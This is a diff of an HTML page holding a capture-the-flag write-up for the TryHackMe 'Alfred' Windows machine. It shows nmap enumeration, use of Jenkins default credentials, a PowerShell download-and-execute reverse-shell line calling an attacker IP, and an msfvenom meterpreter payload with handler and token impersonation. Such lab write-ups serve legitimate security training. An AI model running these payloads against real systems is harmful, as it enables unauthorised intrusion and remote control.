@@ -12,6 +12,8 @@
         <link rel="prev" href="../../HackTheBox/">
       
       
+        <link rel="next" href="../ADBasicEnum/">
+      
       
         
       
@@ -72,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#tryhackme" class="md-skip">
+        <a href="#alfred" class="md-skip">
           Skip to content
         </a>
       
@@ -438,6 +440,18 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#nmap" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -447,12 +461,50 @@
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#escalar-privilegios" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#http-80" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Escalar privilegios
+        HTTP (80)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP (8080)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
       
     </span>
   </a>
@@ -463,6 +515,62 @@
   
 </nav>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
     </li>
   
 
@@ -566,9 +674,10 @@
 
 
 
-<h1 id="tryhackme">TryHackMe<a class="headerlink" href="#tryhackme" title="Permanent link">&para;</a></h1>
+<h1 id="alfred">Alfred<a class="headerlink" href="#alfred" title="Permanent link">&para;</a></h1>
 <p>Windows</p>
-<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.187.139<span class="w"> </span>-oG<span class="w"> </span>allPorts
 
 PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>REASON
@@ -581,36 +690,45 @@ PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class=
 <span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
 <span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
 <span class="p">|</span>_http-title:<span class="w"> </span>Site<span class="w"> </span>doesn<span class="s1">&#39;t have a title (text/html).</span>
+
 <span class="s1">3389/tcp open  tcpwrapped</span>
 <span class="s1">| ssl-cert: Subject: commonName=alfred</span>
 <span class="s1">| Not valid before: 2025-06-29T10:49:57</span>
 <span class="s1">|_Not valid after:  2025-12-29T10:49:57</span>
+
 <span class="s1">8080/tcp open  http       Jetty 9.4.z-SNAPSHOT</span>
 <span class="s1">|_http-title: Site doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>title<span class="w"> </span><span class="o">(</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span>.
 <span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry<span class="w"> </span>
 <span class="p">|</span>_/
 Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:**windows**
 </code></pre></div>
-<p><img alt="alt text" src="image.png" /></p>
-<p><img alt="alt text" src="image-1.png" /></p>
+<h3 id="http-80">HTTP (80)<a class="headerlink" href="#http-80" title="Permanent link">&para;</a></h3>
+<p><img alt="alt text" src="img/image.png" /></p>
+<h3 id="http-8080">HTTP (8080)<a class="headerlink" href="#http-8080" title="Permanent link">&para;</a></h3>
+<p>Credenciales por defecto <code>admin:admin</code></p>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<p><img alt="alt text" src="img/image-13.png" /></p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p><img alt="alt text" src="img/image-14.png" /></p>
+<p>Agregar la sigueinte linea de código</p>
 <div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.9.244.36:8282/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">9</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">36</span> <span class="n">-Port</span> <span class="n">1234</span>
 </code></pre></div>
 <div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8282</span><span class="w"> </span>
 
 nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</span><span class="w">  </span>
 </code></pre></div>
-<p><img alt="alt text" src="image-2.png" /></p>
-<p><img alt="alt text" src="image-3.png" /></p>
-<p><img alt="alt text" src="image-4.png" /></p>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
 <div class="highlight"><pre><span></span><code>PS C:\Users\bruce\Desktop&gt; type user.txt
 79007a09481963edf2e1321abd9ae2a0
 </code></pre></div>
-<h2 id="escalar-privilegios">Escalar privilegios<a class="headerlink" href="#escalar-privilegios" title="Permanent link">&para;</a></h2>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--encoder<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.9.244.36<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>revshell.exe<span class="w">   </span>
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="s2">&quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.9.244.36:8001/revshell.exe&#39;,&#39;revshell.exe&#39;)&quot;</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-5.png" /></p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
 <div class="highlight"><pre><span></span><code>msfdb<span class="w"> </span>run<span class="w">                                                                                                   </span>
 <span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>database
 </code></pre></div>
@@ -625,17 +743,16 @@ msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span cl
 msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
 <span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.9.244.36:5555<span class="w"> </span>
 </code></pre></div>
-<p><img alt="alt text" src="image-6.png" /></p>
-<p><img alt="alt text" src="image-7.png" /></p>
-<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">bruce</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="s1">&#39;C:\Program Fi</span>
-<span class="s1">les (x86)\Jenkins\workspace\admin&#39;</span>
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)\</span><span class="n">Jenkins</span><span class="p">\</span><span class="n">workspace</span><span class="p">\</span><span class="n">admin</span><span class="p">&gt;</span> 
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<div class="highlight"><pre><span></span><code>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\b</span>ruce<span class="se">\D</span>esktop&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="s1">&#39;C:\Program Files (x86)\Jenkins\workspace\admin&#39;</span>
+PS<span class="w"> </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="w"> </span><span class="o">(</span>x86<span class="o">)</span><span class="se">\J</span>enkins<span class="se">\w</span>orkspace<span class="se">\a</span>dmin&gt;<span class="w"> </span>
 </code></pre></div>
-<p><img alt="alt text" src="image-8.png" /></p>
-<div class="highlight"><pre><span></span><code><span class="nb">Start-Process</span> <span class="n">revshell</span><span class="p">.</span><span class="n">exe</span>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<div class="highlight"><pre><span></span><code>Start-Process<span class="w"> </span>revshell.exe
 </code></pre></div>
-<p><img alt="alt text" src="image-9.png" /></p>
-<p><img alt="alt text" src="image-10.png" /></p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
 <div class="highlight"><pre><span></span><code>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>impersonate_token<span class="w"> </span><span class="s2">&quot;BUILTIN\Administrators&quot;</span>
 <span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Warning:<span class="w"> </span>Not<span class="w"> </span>currently<span class="w"> </span>running<span class="w"> </span>as<span class="w"> </span>SYSTEM,<span class="w"> </span>not<span class="w"> </span>all<span class="w"> </span>tokens<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>available
 <span class="w">             </span>Call<span class="w"> </span>rev2self<span class="w"> </span><span class="k">if</span><span class="w"> </span>primary<span class="w"> </span>process<span class="w"> </span>token<span class="w"> </span>is<span class="w"> </span>SYSTEM
@@ -646,11 +763,11 @@ Server<span class="w"> </span>username:<span class="w"> </span>NT<span class="w"
 meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getsystem
 <span class="o">[</span>-<span class="o">]</span><span class="w"> </span>priv_elevate_getsystem:<span class="w"> </span>Operation<span class="w"> </span>failed:<span class="w"> </span>The<span class="w"> </span>environment<span class="w"> </span>is<span class="w"> </span>incorrect
 </code></pre></div>
-<p><img alt="alt text" src="image-11.png" /></p>
-<p><img alt="alt text" src="image-12.png" /></p>
-<p>Flag: root.txt
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<p><img alt="alt text" src="img/image-12.png" /></p>
+<p>Flag: root.txt</p>
 <div class="highlight"><pre><span></span><code><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\r</span>oot.txt
-</code></pre></div></p>
+</code></pre></div>
 
 
 
